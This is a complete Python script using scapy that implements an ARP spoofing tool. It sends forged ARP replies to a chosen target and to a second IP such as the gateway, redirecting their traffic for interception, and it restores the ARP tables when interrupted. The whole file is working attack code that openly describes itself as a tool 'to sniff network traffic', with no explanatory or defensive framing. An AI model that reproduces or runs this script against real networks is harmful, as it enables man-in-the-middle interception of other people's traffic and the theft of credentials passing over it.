#!/usr/bin/python

import scapy.all as scapy
import argparse
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

class ArpSpoofer:
    def __init__(self, target_ip, spoof_ip):
        self.target_ip = target_ip
        self.spoof_ip = spoof_ip

    def get_mac(self, ip):
        # ARP request to get the MAC address
        request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        final_packet = broadcast / request
        answer = scapy.srp(final_packet, timeout=2, verbose=False)[0]
        mac = answer[0][1].hwsrc
        return mac

    def spoof(self, target, spoofed):
        mac = self.get_mac(target)
        packet = scapy.ARP(op=2, hwdst=mac, pdst=target, psrc=spoofed)
        scapy.send(packet, verbose=False)
        print(Fore.YELLOW + f"[+] Spoofing {target} pretending to be {spoofed}")

    def restore(self, dest_ip, source_ip):
        dest_mac = self.get_mac(dest_ip)
        source_mac = self.get_mac(source_ip)
        packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, verbose=False)
        print(Fore.GREEN + f"[+] Restoring {dest_ip} to its original state.")

    def run(self):
        try:
            while True:
                self.spoof(self.target_ip, self.spoof_ip)  # Spoof the target IP
                self.spoof(self.spoof_ip, self.target_ip)  # Spoof the spoofed IP
        except KeyboardInterrupt:
            print(Fore.RED + "[!] Detected CTRL+C. Restoring ARP tables... Please wait.")
            self.restore(self.target_ip, self.spoof_ip)
            self.restore(self.spoof_ip, self.target_ip)
            print(Fore.GREEN + "[+] ARP tables restored.")

if __name__ == "__main__":
    # Setting up argparse for command-line arguments
    parser = argparse.ArgumentParser(description="ARP Spoofing Tool to sniff network traffic.")
    parser.add_argument("-t", "--target", required=True, help="Target IP address to spoof.")
    parser.add_argument("-s", "--spoof", required=True, help="Spoofed IP address (e.g., the gateway IP).")

    # Parse the arguments
    args = parser.parse_args()

    # Create an ArpSpoofer object and start the spoofing process
    spoofer = ArpSpoofer(target_ip=args.target, spoof_ip=args.spoof)
    spoofer.run()
